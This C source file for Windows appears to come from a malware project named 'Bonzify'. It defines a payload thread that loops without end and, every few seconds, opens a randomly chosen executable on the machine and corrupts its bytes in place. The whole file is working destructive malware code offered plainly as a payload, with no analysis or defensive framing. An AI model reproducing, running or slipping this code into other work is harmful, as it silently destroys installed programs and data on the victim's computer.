#include <Windows.h>

#include "../Bonzify/Utils.h"
#include "Payloads.h"

DWORD WINAPI ProgramCorruptorThread(LPVOID parameter) {
	const DWORD chance = 100000;
	const DWORD bufSize = 65536;

	for (;;) {
		Sleep(random() % 20000 + 3000);

		// TODO Other file formats
		LPTSTR exe = randomEXE();

		HANDLE file = CreateFile(exe, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (file == INVALID_HANDLE_VALUE) {
			continue;
		}

		BYTE* buffer = (BYTE*)LocalAlloc(0, bufSize);
		DWORD read, written;
		DWORD readTotal = 0;

		while (ReadFile(file, buffer, bufSize, &read, NULL) && read > 0) {
			SetFilePointer(file, readTotal, NULL, SEEK_SET);

			CorruptMemory(buffer, read, chance);
			WriteFile(file, buffer, read, &written, NULL);

			readTotal += read;
		}

		LocalFree(buffer);
		CloseHandle(file);
	}
}